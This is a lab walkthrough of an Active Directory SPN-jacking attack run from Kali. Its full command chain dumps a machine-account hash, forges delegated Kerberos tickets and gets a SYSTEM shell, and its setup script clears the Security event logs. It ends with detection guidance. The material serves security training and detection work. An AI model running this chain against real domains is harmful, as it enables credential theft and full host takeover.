# Live SPN-Jacking from Linux — Full Attack Chain

**Technique:** Live SPN-Jacking (Elad Shamir)  
**Platform:** Kali Linux → Windows Active Directory  
**Prerequisite:** Low-privilege domain account with WriteSPN on two computer objects + access to a KCD-enabled service account  
**Tools:** krbrelayx/addspn.py, impacket (secretsdump, getST, findDelegation), tgssub.py, smbexec.py

---

## Lab Topology

| Host | IP | Role |
|------|----|------|
| DC01 | 172.16.61.144 | Domain Controller (Server 2022) |
| SRV01 | 172.16.61.140 | Delegation source (Server 2022) |
| DBSRV002 | 172.16.61.145 | SPN donor (Server 2019) |
| WEB01B | 172.16.61.146 | Target (Server 2019) |
| Kali | 172.16.61.129 | Attack box |

**Domain:** LAB2019.LOCAL  
**Attack account:** `ownerofalonelySPN` / Password123  
**ACLs:** ownerofalonelySPN has WriteSPN on DBSRV002 and WEB01B  
**Delegation:** SRV01$ has constrained delegation with protocol transition to `dmserver/DBSRV002`

---

## Why This Attack Works

SRV01 is configured for constrained delegation to the SPN `dmserver/DBSRV002`. The KDC enforces delegation by SPN string, not by which machine owns it. If you move that SPN to a different machine, the KDC will encrypt delegation tickets with that machine's key instead. The target machine has no idea it was substituted — it just decrypts a valid ticket for Administrator and grants access.

The attack requires no Domain Admin, no krbtgt, no golden ticket. Just WriteSPN on two objects and local admin on SRV01.

---

## Prerequisites — Kali Setup

Add all lab hosts to `/etc/hosts`:

```
172.16.61.144 DC01.LAB2019.LOCAL DC01
172.16.61.145 DBSRV002.LAB2019.LOCAL DBSRV002
172.16.61.146 WEB01B.LAB2019.LOCAL WEB01B
172.16.61.140 SRV01.LAB2019.LOCAL SRV01
```

Sync time to DC (Kerberos requires <5 min skew):

```bash
sudo ntpdate 172.16.61.144
```

Confirm tools:

```bash
ls /home/kali/krbrelayx/addspn.py
ls /home/kali/tgssub/examples/tgssub.py
```

Install if missing:

```bash
git clone https://github.com/dirkjanm/krbrelayx /home/kali/krbrelayx
git clone https://github.com/ShutdownRepo/impacket /home/kali/tgssub
pip install impacket --break-system-packages
```

---

## Attack Chain

### L01 — Baseline: Confirm No Access to WEB01B

```bash
smbclient //WEB01B/C$ -U LAB2019/ownerofalonelySPN%Password123
```

Returns `NT_STATUS_ACCESS_DENIED`. This is your before state. Screenshot L01.

---

### L02 — Enumerate Constrained Delegation

```bash
python3 /usr/share/doc/python3-impacket/examples/findDelegation.py \
  LAB2019.LOCAL/ownerofalonelySPN:Password123 \
  -dc-ip 172.16.61.144
```

Queries DC via LDAP for any account with `msDS-AllowedToDelegateTo` set. Returns SRV01$ delegating to `dmserver/DBSRV002`. Confirms SPN exists. This identifies your delegation source and target SPN. Screenshot L02.

---

### L03 — Enumerate DBSRV002 SPNs

```bash
python3 /home/kali/krbrelayx/addspn.py \
  -q \
  -t 'DBSRV002$' \
  -u 'LAB2019\ownerofalonelySPN' \
  -p 'Password123' \
  172.16.61.144
```

Reads `servicePrincipalName` attribute on DBSRV002 via LDAP. Save this output — you need it for restoration at L11. Screenshot L03.

---

### L04 — Strip DBSRV002 SPNs

```bash
python3 /home/kali/krbrelayx/addspn.py \
  --clear \
  -t 'DBSRV002$' \
  -u 'LAB2019\ownerofalonelySPN' \
  -p 'Password123' \
  172.16.61.144
```

Writes an empty value to `servicePrincipalName` on DBSRV002 via LDAP. Works because ownerofalonelySPN has WriteSPN on DBSRV002. After this no account owns `dmserver/DBSRV002`. The KDC lookup returns nothing. Screenshot L04.

---

### L05 — Jack SPN to WEB01B

```bash
python3 /home/kali/krbrelayx/addspn.py \
  -s 'dmserver/DBSRV002' \
  -t 'WEB01B$' \
  -u 'LAB2019\ownerofalonelySPN' \
  -p 'Password123' \
  172.16.61.144
```

Writes `dmserver/DBSRV002` to `servicePrincipalName` on WEB01B via LDAP. The KDC now associates that SPN with WEB01B. Any Kerberos ticket issued for `dmserver/DBSRV002` will be encrypted with WEB01B's secret key. This is the pivot — you've redirected the encryption target. Screenshot L05.

> **Note on WEB01B permissions:** Windows Server enforces validated write on `servicePrincipalName`. Both `WP` (WriteProperty) and `GW` (GenericWrite) are subject to this enforcement — the DC blocks any SPN that doesn't match the machine's hostname, regardless of what ACL is granted. Only `GA` (GenericAll) bypasses this check. The lab grants `ownerofalonelySPN` GenericAll on WEB01B to simulate a real-world misconfiguration — a helpdesk or service account with GenericAll on a computer object, which is a common finding in enterprise AD environments.

---

### L06 — Extract SRV01$ Machine Account Hash

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  Administrator:'<local_admin_password>'@172.16.61.140
```

Opens SMB to SRV01 using local Administrator credentials. Starts RemoteRegistry remotely, reads LSA Secrets hive, extracts `$MACHINE.ACC` — the machine account password stored in LSA. Derives NTLM hash for SRV01$.

You need this hash to authenticate as SRV01$ to the KDC for S4U2Proxy. No domain admin involved — local admin on SRV01 is the only requirement. Screenshot L06.

---

### L07 — Request Forged Service Ticket (S4U2Self + S4U2Proxy)

```bash
python3 /usr/share/doc/python3-impacket/examples/getST.py \
  -spn 'dmserver/DBSRV002' \
  -impersonate Administrator \
  'LAB2019.LOCAL/SRV01$' \
  -hashes :00267cbbf28ddde2f545ccffc3590e00 \
  -dc-ip 172.16.61.144
```

Three exchanges happen:

1. Authenticates to DC as SRV01$ using the NTLM hash — gets a TGT
2. S4U2Self — SRV01$ asks KDC for a ticket proving Administrator authenticated to it. Allowed because SRV01$ has `TrustedToAuthForDelegation`. No Administrator password needed.
3. S4U2Proxy — SRV01$ presents the S4U2Self ticket and requests a service ticket for `dmserver/DBSRV002` as Administrator. KDC validates the delegation list, issues the ticket encrypted with WEB01B's key (because WEB01B now owns that SPN).

Output: `Administrator@dmserver_DBSRV002@LAB2019.LOCAL.ccache`. Screenshot L07.

---

### L08 — Rewrite Ticket Service Name

```bash
python3 /home/kali/tgssub/examples/tgssub.py \
  -in Administrator@dmserver_DBSRV002@LAB2019.LOCAL.ccache \
  -altservice "cifs/WEB01B.LAB2019.LOCAL" \
  -out newticket.ccache
```

Rewrites the `sname` field in the unencrypted outer header of the ticket from `dmserver/DBSRV002` to `cifs/WEB01B.LAB2019.LOCAL`. The encrypted PAC containing the Administrator identity is not touched.

WEB01B's SMB service identifies as `cifs/WEB01B.LAB2019.LOCAL`. Without this rewrite it would reject the ticket. With the rewrite, WEB01B decrypts it with its own key, reads Administrator from the PAC, and grants access. Screenshot L08.

---

### L09 — Land on WEB01B as SYSTEM

```bash
KRB5CCNAME=newticket.ccache python3 \
  /usr/share/doc/python3-impacket/examples/smbexec.py \
  -k -no-pass \
  -dc-ip 172.16.61.144 \
  WEB01B.LAB2019.LOCAL
```

`KRB5CCNAME` points the Kerberos library at the rewritten ccache. `-k` enables Kerberos auth. `-no-pass` uses the ticket as the credential. smbexec connects to WEB01B SMB, presents the ticket, gets accepted as Administrator, uploads a service binary, spawns a shell as SYSTEM. Screenshot L09.

---

### L10 — Read Flag

```cmd
type C:\flag.txt
```

Screenshot L10.

---

### L11 — Restore DBSRV002 SPNs

```bash
python3 /home/kali/krbrelayx/addspn.py \
  -s 'dmserver/DBSRV002' \
  -t 'DBSRV002$' \
  -u 'LAB2019\ownerofalonelySPN' \
  -p 'Password123' \
  172.16.61.144

python3 /home/kali/krbrelayx/addspn.py \
  -s 'dmserver/DBSRV002.LAB2019.LOCAL' \
  -t 'DBSRV002$' \
  -u 'LAB2019\ownerofalonelySPN' \
  -p 'Password123' \
  172.16.61.144
```

Restores DBSRV002's original SPNs via LDAP. The ticket already issued remains valid until expiry — restoration does not invalidate it. Screenshot L11.

---

### L12 — DC01 Telemetry

```powershell
Get-WinEvent -LogName Security | Where-Object {$_.Id -in @(4742,4769)} | Format-List TimeCreated, Id, Message
```

Screenshot L12.

---

## Telemetry Analysis

### Event 4742 — Computer Account Changed (SPN Modified)

Two events fire in rapid succession:

- `DBSRV002$` — `servicePrincipalName` cleared (strip)
- `WEB01B$` — `servicePrincipalName` now contains `dmserver/DBSRV002` (jack)

The `Subject` field shows which account performed the modification — in a correctly configured lab this will be `ownerofalonelySPN`, a low-privilege user. This is the primary detection indicator.

### Event 4769 — Kerberos Service Ticket Requested

Four events fire:

| Time | Account | Service | Ticket Options | Significance |
|------|---------|---------|---------------|--------------|
| T+0 | SRV01$ | SRV01$ | 0x40810000 | S4U2Self — no Transited Services |
| T+0 | SRV01$ | WEB01B$ | 0x40830000 | S4U2Proxy — Transited Services: SRV01$ |

The S4U2Proxy ticket (Ticket Options `0x40830000`) with `Transited Services: SRV01$` is the delegation chain firing. The service name resolves to WEB01B because that's where the SPN was jacked to.

### Detection Signature

SPN jacking produces a distinctive paired pattern: 4742 showing `servicePrincipalName` moved between two computer accounts within seconds, immediately followed by 4769 showing S4U2Proxy from the delegating machine targeting the destination account. Neither event alone is conclusive — the correlation between them is the signal.

---

## Windows vs Linux — Method Comparison

| | Windows (Rubeus) | Linux (impacket/krbrelayx) |
|--|-----------------|---------------------------|
| SPN manipulation | PowerView via LDAP | addspn.py via LDAP |
| Ticket request | Rubeus s4u | getST.py |
| Ticket rewrite | Rubeus tgssub | tgssub.py |
| Lateral movement | Enter-PSSession (WinRM) | smbexec (CIFS) |
| Ticket storage | In-memory | ccache file on disk |
| Windows foothold required | Yes (to run Rubeus) | No |
| Detection signature | Identical | Identical |

The key differentiator: the Linux path requires no Windows foothold at all. Network access and LDAP credentials are sufficient for the entire attack chain. The ccache file written to disk during tgssub is a detection artifact the Windows in-memory path avoids.

---

## Theoretical Foundation

Elad Shamir, the researcher who identified this technique, states it precisely:

> "Configuring Unconstrained Delegation and Constrained Delegation requires the SeEnableDelegation privilege, which, by default, is granted only to Domain Admins. Therefore, even if a user had full control (GenericAll) on an AD account, he would not be able to configure either of these Kerberos delegation types without also having the SeEnableDelegation privilege. [...] Note that users need special privileges to change the Constrained Delegation configuration, but no special privileges are required for changing SPNs. Therefore, it may be interesting to tackle scenarios with the compromise of Constrained Delegation from a different angle – manipulating the SPN attribute rather than the delegation configuration."

This is the logic that makes Live SPN-Jacking possible. You cannot reconfigure delegation without DA. But you do not need to. The delegation is already configured — you just redirect where the SPN points. The KDC does not care which machine owns the SPN. It encrypts the ticket for whoever owns it at the moment of the request.

The corollary — and the thing that caused the most pain in building this lab — is that SPN manipulation is only "no special privileges required" when the SPN matches the target machine's hostname. Writing a foreign SPN (`dmserver/DBSRV002` onto `WEB01B`) triggers Windows validated write enforcement. `WriteProperty` and `GenericWrite` both fail. Only `GenericAll` bypasses the hostname alignment check. This is the misconfiguration the attack requires on the target object.

---

## Lab Setup Script

Run on DC01 as Domain Administrator after all machines are domain-joined.

```powershell
# ============================================================
# LAB2019 SPN-JACKING LAB SETUP SCRIPT V3
# Run on DC01 as Domain Administrator AFTER domain is built
# Domain: LAB2019.LOCAL
# ============================================================
# TOPOLOGY:
#   DC01     172.16.61.144  - Domain Controller (Server 2022)
#   SRV01    172.16.61.140  - Delegation source (Server 2022)
#   DBSRV002 172.16.61.145  - SPN donor (Server 2019)
#   WEB01B   172.16.61.146  - Landing target (Server 2019)
#   Kali     172.16.61.129  - Attack box
#
# ATTACK USER: ownerofalonelySPN / Password123
# ============================================================

Import-Module ActiveDirectory

# STEP 1 - Clear any leftover SPNs from previous runs
Write-Host "[*] Step 1 - Cleaning leftover dmserver SPNs" -ForegroundColor Cyan
setspn -D dmserver/DBSRV002 DBSRV002$ 2>$null
setspn -D dmserver/DBSRV002.LAB2019.LOCAL DBSRV002$ 2>$null
setspn -D dmserver/DBSRV002 WEB01B$ 2>$null
setspn -D dmserver/DBSRV002.LAB2019.LOCAL WEB01B$ 2>$null
Write-Host "[+] Clean" -ForegroundColor Green

# STEP 2 - Set SPNs on DBSRV002 (the donor)
Write-Host "[*] Step 2 - Setting SPNs on DBSRV002" -ForegroundColor Cyan
setspn -S dmserver/DBSRV002 DBSRV002$
setspn -S dmserver/DBSRV002.LAB2019.LOCAL DBSRV002$
Write-Host "[+] DBSRV002 SPNs set" -ForegroundColor Green

# STEP 3 - Create lab attack user
Write-Host "[*] Step 3 - Creating ownerofalonelySPN" -ForegroundColor Cyan
$userExists = Get-ADUser -Filter {SamAccountName -eq "ownerofalonelySPN"} -ErrorAction SilentlyContinue
if (-not $userExists) {
    New-ADUser `
        -Name "ownerofalonelySPN" `
        -SamAccountName "ownerofalonelySPN" `
        -AccountPassword (ConvertTo-SecureString "Password123" -AsPlainText -Force) `
        -Enabled $true `
        -PasswordNeverExpires $true
    Write-Host "[+] User created" -ForegroundColor Green
} else {
    Write-Host "[!] User already exists, skipping" -ForegroundColor Yellow
}

# STEP 4 - Grant ownerofalonelySPN WriteSPN on DBSRV002
# Validated write is sufficient here - SPN matches DBSRV002 hostname
Write-Host "[*] Step 4 - Granting WriteSPN on DBSRV002" -ForegroundColor Cyan
$dbsrv002DN = (Get-ADComputer DBSRV002).DistinguishedName
dsacls "$dbsrv002DN" /G "LAB2019\ownerofalonelySPN:WP;servicePrincipalName;" | Out-Null
Write-Host "[+] Done" -ForegroundColor Green

# STEP 5 - Grant ownerofalonelySPN GenericAll on WEB01B
# GA required - WP and GW both fail for foreign SPNs due to
# Windows validated write enforcement (hostname alignment check)
# Simulates real-world misconfiguration: helpdesk/service account
# with GenericAll on a computer object
Write-Host "[*] Step 5 - Granting GenericAll on WEB01B" -ForegroundColor Cyan
$web01bDN = (Get-ADComputer WEB01B).DistinguishedName
dsacls "$web01bDN" /G "LAB2019\ownerofalonelySPN:GA;;" | Out-Null
Write-Host "[+] Done" -ForegroundColor Green

# STEP 6 - Configure SRV01 constrained delegation with protocol transition
Write-Host "[*] Step 6 - Configuring SRV01 constrained delegation" -ForegroundColor Cyan
Set-ADComputer SRV01 -Add @{"msDS-AllowedToDelegateTo" = @(
    "dmserver/DBSRV002",
    "dmserver/DBSRV002.LAB2019.LOCAL"
)}
Set-ADAccountControl SRV01$ -TrustedToAuthForDelegation $true
Write-Host "[+] Done" -ForegroundColor Green

# STEP 7 - Enable audit policy
# 4742 = Computer account changed (SPN modified)
# 4769 = Kerberos service ticket requested (S4U)
# 4768 = Kerberos TGT requested
# 5136 = Directory service object modified
Write-Host "[*] Step 7 - Enabling audit policy" -ForegroundColor Cyan
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
Write-Host "[+] Audit policy set" -ForegroundColor Green

# STEP 8 - Clear event logs (clean baseline)
Write-Host "[*] Step 8 - Clearing event logs" -ForegroundColor Cyan
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Directory Service"
Write-Host "[+] Logs cleared" -ForegroundColor Green

# STEP 9 - Verify
Write-Host "[*] Step 9 - Verification" -ForegroundColor Cyan
Write-Host "--- DBSRV002 SPNs (should show dmserver/DBSRV002*) ---"
setspn -L DBSRV002$
Write-Host "--- WEB01B SPNs (should NOT show dmserver/*) ---"
setspn -L WEB01B$
Write-Host "--- SRV01 delegation ---"
Get-ADComputer SRV01 -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation |
    Select-Object Name, TrustedToAuthForDelegation, msDS-AllowedToDelegateTo | Format-List
auditpol /get /subcategory:"Computer Account Management"
auditpol /get /subcategory:"Kerberos Service Ticket Operations"

Write-Host "============================================================" -ForegroundColor Yellow
Write-Host "MANUAL STEPS REQUIRED:" -ForegroundColor Yellow
Write-Host "1. RDP to WEB01B: New-Item -Path 'C:\flag.txt' -ItemType File -Value 'SPN_JACKED{L1v3_Fr0m_K4l1}'"
Write-Host "2. Kali /etc/hosts: 172.16.61.144 DC01.LAB2019.LOCAL DC01"
Write-Host "                    172.16.61.145 DBSRV002.LAB2019.LOCAL DBSRV002"
Write-Host "                    172.16.61.146 WEB01B.LAB2019.LOCAL WEB01B"
Write-Host "                    172.16.61.140 SRV01.LAB2019.LOCAL SRV01"
Write-Host "3. Kali time sync:  sudo ntpdate 172.16.61.144"
Write-Host "[+] LAB READY FOR ATTACK CHAIN" -ForegroundColor Green
```

---

## References

- Elad Shamir — [SPN Jacking](https://eladshamir.com/2022/02/10/SPN-jacking.html)
- Dirk-jan Mollema — [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- ShutdownRepo — [impacket fork with tgssub](https://github.com/ShutdownRepo/impacket)
- HTB Academy — Kerberos Attacks module / DACL ATTACKS II module
